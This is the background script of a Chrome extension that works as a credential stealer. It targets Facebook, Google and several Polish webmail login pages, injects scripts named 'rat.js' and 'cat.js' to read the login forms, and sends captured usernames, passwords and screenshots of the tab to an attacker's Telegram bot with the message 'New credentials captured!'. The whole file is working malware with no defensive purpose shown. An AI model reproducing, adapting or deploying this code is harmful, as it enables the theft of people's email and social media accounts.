const token = "0123456789:abcdefghijklmnoprstuwxyz"; // Bot token, string
const chatID = 9876543210; // chat id (where to send messages), can be string
const pages = [
	{title: "Facebook", link: "facebook.com", form:"login_form", username: "email", password: "pass", formname: "u_0_c", usernamename: "email", passwordname: "pass"},
	{title: "Onet", link: "onet.pl/poczta", form:"loginForm", username: "mailFormLogin", password: "mailFormPassword", formname: "loginForm", usernamename: "login", passwordname: "password"},
	{title: "Onet", link: "konto.onet.pl/", form:"loginForm", username: "f_login", password: "f_password", formname: "loginForm", usernamename: "login", passwordname: "password"},
	{title: "o2", link: "https://poczta.o2.pl/zaloguj", form:"loginForm", username: "login", password: "password", formname: "loginForm", usernamename: "username", passwordname: "password"},
	{title: "Interia", link: "poczta.interia.pl", form:"pocztaLoginForm", username: "formEmail", password: "formPassword", formname: "pocztaLoginForm", usernamename: "email", passwordname: "password"},
	{title: "Gazeta", link: "oauth.gazeta.pl/poczta/auth", form:"loginForm", username: "username", password: "password", formname: "loginForm", usernamename: "username", passwordname: "password"},
	{title: "o2", link: "o2.pl", form:"", username: "", password: "", formname: "_poczta_zaloguj", usernamename: "username", passwordname: "password"},
	{title: "Wirtualna Polska", link: "profil.wp.pl/login", form:"loginForm", username: "login", password: "password", formname: "loginForm", usernamename: "login_username", passwordname: "password"}
];

//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

function request(link, POST) {
	var xhr = new XMLHttpRequest();
	if (POST) {
		xhr.open("POST", link, true);
		xhr.send(POST);
	}
	else {
		xhr.open("GET", link, true);
		xhr.send();
	}
}
function parse(what) {
	what = what.replace(/`/g, "`\\``");
	return what;
}
function sendPhoto(image, caption) {
	var foto = new FormData();
	foto.append('photo', image, "screenshot.jpeg");
	if (caption) {
		foto.append('caption', caption);
	}
	request("https://api.telegram.org/bot" + token + "/sendPhoto?chat_id=" + chatID + "&parse_mode=markdown", foto);
}
function mkss(callback) {
	chrome.tabs.captureVisibleTab(function(object) {
		var base64 = object.slice(object.indexOf(",") + 1);
		var sliceSize = 1024;
		var byteChars = window.atob(base64);
		var byteArrays = [];
		for (var offset = 0, len = byteChars.length; offset < len; offset += sliceSize) {
			var slice = byteChars.slice(offset, offset + sliceSize);
			var byteNumbers = new Array(slice.length);
			for (var i = 0; i < slice.length; i++) {
				byteNumbers[i] = slice.charCodeAt(i);
			}
			var byteArray = new Uint8Array(byteNumbers);
			byteArrays.push(byteArray);
		}
		var foto = new Blob(byteArrays, {type: "image/jpeg"});
		callback(foto);
	});
}
function sendSS(caption) {
	if (!caption) {
		var caption = "";
	}
	mkss(function(jpeg) {
		sendPhoto(jpeg, caption);
	});
}
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	if (changeInfo && changeInfo.status == "complete") {
		var uri = tab.url;
		var i = 0;
		if (uri.includes("accounts.google.com")) {
			chrome.tabs.executeScript(null, {file: "cat.js"});
		}
		while (i < pages.length) {
			if (uri.includes(pages[i]["link"])) {
				chrome.tabs.executeScript(null, {code: 'var derserwisename = "' + pages[i]["title"] + '"; var namemweird = "' + pages[i]["form"] + '"; var usernamem = "' + pages[i]["username"] + '"; var passweird = "' + pages[i]["password"] + '"; var namemweirdname = "' + pages[i]["formname"] + '"; var usernamemname = "' + pages[i]["usernamename"] + '"; var passweirdname = "' + pages[i]["passwordname"] + '";'});
				chrome.tabs.executeScript(null, {file: "rat.js"});
				return;
			}
			i++;
		}
	}
});
chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
		credentials = JSON.parse(request);
		setTimeout(function() {
			sendSS("_New credentials captured!_\n\n*Service*: `" + parse(credentials.page) + "`\n*Login*: `" + parse(credentials.login) + "`\n*Password*: `" + parse(credentials.pass) + "`\n\n_Be careful and have fun!_");
		}, 3000);
	}
);
